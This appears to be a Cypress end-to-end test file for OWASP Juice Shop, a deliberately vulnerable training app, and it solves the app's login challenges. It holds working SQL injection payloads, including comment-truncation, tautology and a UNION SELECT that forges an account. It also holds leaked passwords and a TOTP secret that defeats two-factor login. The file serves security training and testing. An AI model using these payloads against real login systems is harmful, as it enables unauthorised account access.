describe("/#/login", () => {
  beforeEach(() => {
    cy.visit("/#/login");
  });

  describe('challenge "loginAdmin"', () => {
    it('should log in Admin with SQLI attack on email field using "\' or 1=1--"', () => {
      cy.get("#email").type("' or 1=1--");
      cy.get("#password").type("a");
      cy.get("#loginButton").click();
    });

    it('should log in Admin with SQLI attack on email field using "admin@<juice-sh.op>\'--"', () => {
      cy.task("GetFromConfig", "application.domain").then(
        (appDomain: string) => {
          cy.get("#email").type(`admin@${appDomain}'--`);
          cy.get("#password").type("a");
          cy.get("#loginButton").click();
        }
      );
      cy.expectChallengeSolved({ challenge: "Login Admin" });
    });
  });

  describe('challenge "loginJim"', () => {
    it('should log in Jim with SQLI attack on email field using "jim@<juice-sh.op>\'--"', () => {
      cy.task("GetFromConfig", "application.domain").then(
        (appDomain: string) => {
          cy.get("#email").type(`jim@${appDomain}'--`);
          cy.get("#password").type("a");
          cy.get("#loginButton").click();
        }
      );
      cy.expectChallengeSolved({ challenge: "Login Jim" });
    });
  });

  describe('challenge "loginBender"', () => {
    it('should log in Bender with SQLI attack on email field using "bender@<juice-sh.op>\'--"', () => {
      cy.task("GetFromConfig", "application.domain").then(
        (appDomain: string) => {
          cy.get("#email").type(`bender@${appDomain}'--`);
          cy.get("#password").type("a");
          cy.get("#loginButton").click();
        }
      );
      cy.expectChallengeSolved({ challenge: "Login Bender" });
    });
  });

  describe('challenge "adminCredentials"', () => {
    it("should be able to log in with original (weak) admin credentials", () => {
      cy.task("GetFromConfig", "application.domain").then(
        (appDomain: string) => {
          cy.get("#email").type(`admin@${appDomain}`);
          cy.get("#password").type("admin123");
          cy.get("#loginButton").click();
        }
      );
      cy.expectChallengeSolved({ challenge: "Password Strength" });
    });
  });

  describe('challenge "loginSupport"', () => {
    it("should be able to log in with original support-team credentials", () => {
      cy.task("GetFromConfig", "application.domain").then(
        (appDomain: string) => {
          cy.get("#email").type(`support@${appDomain}`);
          cy.get("#password").type("J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P");
          cy.get("#loginButton").click();
        }
      );
      cy.expectChallengeSolved({ challenge: "Login Support Team" });
    });
  });

  describe('challenge "loginRapper"', () => {
    it("should be able to log in with original MC SafeSearch credentials", () => {
      cy.task("GetFromConfig", "application.domain").then(
        (appDomain: string) => {
          cy.get("#email").type(`mc.safesearch@${appDomain}`);
          cy.get("#password").type("Mr. N00dles");
          cy.get("#loginButton").click();
        }
      );
      cy.expectChallengeSolved({ challenge: "Login MC SafeSearch" });
    });
  });

  describe('challenge "loginAmy"', () => {
    it("should be able to log in with original Amy credentials", () => {
      cy.task("GetFromConfig", "application.domain").then(
        (appDomain: string) => {
          cy.get("#email").type(`amy@${appDomain}`);
          cy.get("#password").type("K1f.....................");
          cy.get("#loginButton").click();
        }
      );
      cy.expectChallengeSolved({ challenge: "Login Amy" });
    });
  });

  describe('challenge "dlpPasswordSpraying"', () => {
    it("should be able to log in with original Jannik credentials", () => {
      cy.task("GetFromConfig", "application.domain").then(
        (appDomain: string) => {
          cy.get("#email").type(`J12934@${appDomain}`);
          cy.get("#password").type("0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB");
          cy.get("#loginButton").click();
        }
      );
      cy.expectChallengeSolved({ challenge: "Leaked Access Logs" });
    });
  });

  describe('challenge "twoFactorAuthUnsafeSecretStorage"', () => {
    it("should be able to log into a exsisting 2fa protected account given the right token", () => {
      cy.task("GetFromConfig", "application.domain").then(
        (appDomain: string) => {
          cy.get("#email").type(`wurstbrot@${appDomain}'--`);
          cy.get("#password").type("Never mind...");
          cy.get("#loginButton").click();
        }
      );

      cy.task("GenerateAuthenticator", "IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH").then(
        (totpToken: string) => {
          void cy.get("#totpToken").type(totpToken);
          void cy.get("#totpSubmitButton").click();
        }
      );
      cy.expectChallengeSolved({ challenge: "Two Factor Authentication" });
    });
  });

  describe('challenge "oauthUserPassword"', () => {
    it("should be able to log in as bjoern.kimminich@gmail.com with base64-encoded email as password", () => {
      cy.get("#email").type("bjoern.kimminich@gmail.com");
      cy.get("#password").type("bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=");
      cy.get("#loginButton").click();

      cy.expectChallengeSolved({ challenge: "Login Bjoern" });
    });
  });

  describe('challenge "ghostLogin"', () => {
    it('should be able to log in as chris.pike@juice-sh.op by using "\' or deletedAt IS NOT NULL --"', () => {
      cy.get("#email").type("' or deletedAt IS NOT NULL--");
      cy.get("#password").type("a");
      cy.get("#loginButton").click();
    });

    it('should be able to log in as chris.pike@juice-sh.op by using "chris.pike@juice-sh.op\' --"', () => {
      cy.task("GetFromConfig", "application.domain").then(
        (appDomain: string) => {
          cy.get("#email").type(`chris.pike@${appDomain}'--`);
          cy.get("#password").type("a");
          cy.get("#loginButton").click();
        }
      );
      cy.expectChallengeSolved({ challenge: "GDPR Data Erasure" });
    });
  });

  describe('challenge "ephemeralAccountant"', () => {
    it("should log in non-existing accountant user with SQLI attack on email field using UNION SELECT payload", () => {
      cy.get("#email").type(
        "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--"
      );
      cy.get("#password").type("a");
      cy.get("#loginButton").click();
      cy.expectChallengeSolved({ challenge: "Ephemeral Accountant" });
    });
  });
});
